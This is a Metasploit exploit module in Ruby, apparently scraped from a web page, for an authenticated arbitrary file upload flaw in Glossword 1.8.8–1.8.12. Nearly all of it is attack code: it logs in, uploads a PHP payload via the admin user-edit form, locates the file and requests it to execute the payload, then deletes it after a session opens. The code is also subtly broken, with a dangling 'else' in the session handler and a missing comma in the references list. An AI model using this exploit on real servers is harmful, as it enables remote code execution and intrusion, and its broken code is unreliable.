# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability",
            &#039;Description&#039;    => %q{
                This module exploits a file upload vulnerability in Glossword
                versions 1.8.8 to 1.8.12 when run as a standalone application.
                This application has an upload feature that allows an authenticated user
                with administrator roles to upload arbitrary files to the &#039;gw_temp/a/&#039;
                directory.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;AkaStep&#039;, # Discovery
                    &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # metasploit exploit
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;EDB&#039;,  &#039;24456&#039; ],
                    [ &#039;OSVDB&#039; &#039;89960&#039; ]
                ],
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]],
            &#039;Privileged&#039;     => true,
            &#039;DisclosureDate&#039; => "Feb 05 2013",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/glossword/1.8/&#039;]),
                OptString.new(&#039;USERNAME&#039;,  [true, &#039;The username for Glossword&#039;, &#039;admin&#039;]),
                OptString.new(&#039;PASSWORD&#039;,  [true, &#039;The password for Glossword&#039;, &#039;admin&#039;])
            ], self.class)
    end
 
    def check
 
        base  = target_uri.path
        peer  = "#{rhost}:#{rport}"
        user  = datastore[&#039;USERNAME&#039;]
        pass  = datastore[&#039;PASSWORD&#039;]
 
        # login
        print_status("#{peer} - Authenticating as user &#039;#{user}&#039;")
        begin
            res = login(base, user, pass)
            if res
                if res.code == 200
                    print_error("#{peer} - Authentication failed")
                    return Exploit::CheckCode::Unknown
                elsif res.code == 301 and res.headers[&#039;set-cookie&#039;] =~ /sid([\da-f]+)=([\da-f]{32})/
                    print_good("#{peer} - Authenticated successfully")
                    return Exploit::CheckCode::Appears
                end
            end
            return Exploit::CheckCode::Safe
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            print_error("#{peer} - Connection failed")
        end
        return Exploit::CheckCode::Unknown
 
    end
 
    def on_new_session(client)
            client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
            client.fs.file.rm("#{@fname}")
        else
            client.shell_command_token("rm #{@fname}")
        end
    end
 
    def upload(base, sid, fname, file)
 
        user = datastore[&#039;USERNAME&#039;]
        pass = datastore[&#039;PASSWORD&#039;]
        data = Rex::MIME::Message.new
        data.add_part(file,       &#039;application/x-php&#039;, nil, "form-data; name=\"file_location\"; filename=\"#{fname}\"")
        data.add_part("edit-own", nil, nil, &#039;form-data; name="a"&#039;)
        data.add_part("users",    nil, nil, &#039;form-data; name="t"&#039;)
        data.add_part("Save",     nil, nil, &#039;form-data; name="post"&#039;)
        data.add_part("#{sid}",   nil, nil, &#039;form-data; name="sid"&#039;)
        data.add_part("#{user}",  nil, nil, &#039;form-data; name="arPost[login]"&#039;)
        data.add_part("#{pass}",  nil, nil, &#039;form-data; name="arPost[pass_new]"&#039;)
        data.add_part("#{pass}",  nil, nil, &#039;form-data; name="arPost[pass_confirm]"&#039;)
 
        data_post = data.to_s
        data_post = data_post.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)
 
        res = send_request_cgi({
            &#039;method&#039;  => &#039;POST&#039;,
            &#039;uri&#039;     => normalize_uri(base, &#039;gw_admin.php&#039;),
            &#039;ctype&#039;   => "multipart/form-data; boundary=#{data.bound}",
            &#039;data&#039;    => data_post,
        })
 
        return res
    end
 
    def login(base, user, pass)
 
        res   = send_request_cgi({
            &#039;method&#039; => &#039;POST&#039;,
            &#039;uri&#039;    => normalize_uri(base, &#039;gw_login.php&#039;),
            &#039;data&#039;   => "arPost%5Buser_name%5D=#{user}&arPost%5Buser_pass%5D=#{pass}&arPost%5Blocale_name%5D=en-utf8&a=login&sid=&post=Enter"
        })
        return res
 
    end
 
    def exploit
 
        base  = target_uri.path
        @peer = "#{rhost}:#{rport}"
        @fname= rand_text_alphanumeric(rand(10)+6) + &#039;.php&#039;
        user  = datastore[&#039;USERNAME&#039;]
        pass  = datastore[&#039;PASSWORD&#039;]
 
        # login; get session id and token
        print_status("#{@peer} - Authenticating as user &#039;#{user}&#039;")
        res = login(base, user, pass)
        if res and res.code == 301 and res.headers[&#039;set-cookie&#039;] =~ /sid([\da-f]+)=([\da-f]{32})/
            token = "#{$1}"
            sid   = "#{$2}"
            print_good("#{@peer} - Authenticated successfully")
        else
            fail_with(Exploit::Failure::NoAccess, "#{@peer} - Authentication failed")
        end
 
        # upload PHP payload
        print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length} bytes)")
        php = %Q|<?php #{payload.encoded} ?>|
        begin
            res = upload(base, sid, @fname, php)
            if res and res.code == 301 and res[&#039;location&#039;] =~ /Setting saved/
                print_good("#{@peer} - File uploaded successfully")
            else
                fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Uploading PHP payload failed")
            end
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
        end
 
        # retrieve PHP file path
        print_status("#{@peer} - Locating PHP payload file")
        begin
            res   = send_request_cgi({
                &#039;method&#039; => &#039;GET&#039;,
                &#039;uri&#039;    => normalize_uri(base, &#039;gw_admin.php?a=edit-own&t=users&#039;),
                &#039;cookie&#039; => "sid#{token}=#{sid}"
            })
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
        end
        if res and res.code == 200 and res.body =~ /<img width="" height="" src="([^"]+)"/
            shell_uri = "#{$1}"
            @fname    = shell_uri.match(&#039;(\d+_[a-zA-Z\d]+\.php)&#039;)
            print_good("#{@peer} - Found payload file path (#{shell_uri})")
        else
            fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Failed to find PHP payload file path")
        end
 
        # retrieve and execute PHP payload
        print_status("#{@peer} - Executing payload (#{shell_uri})")
        begin
            send_request_cgi({
                &#039;method&#039; => &#039;GET&#039;,
                &#039;uri&#039;    => normalize_uri(base, shell_uri),
            })
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
            fail_with(Exploit::Failure::Unreachable, "#{@peer} - Connection failed")
        end
        if !res or res.code != 200
            fail_with(Exploit::Failure::UnexpectedReply, "#{@peer} - Executing payload failed")
        end
    end
end

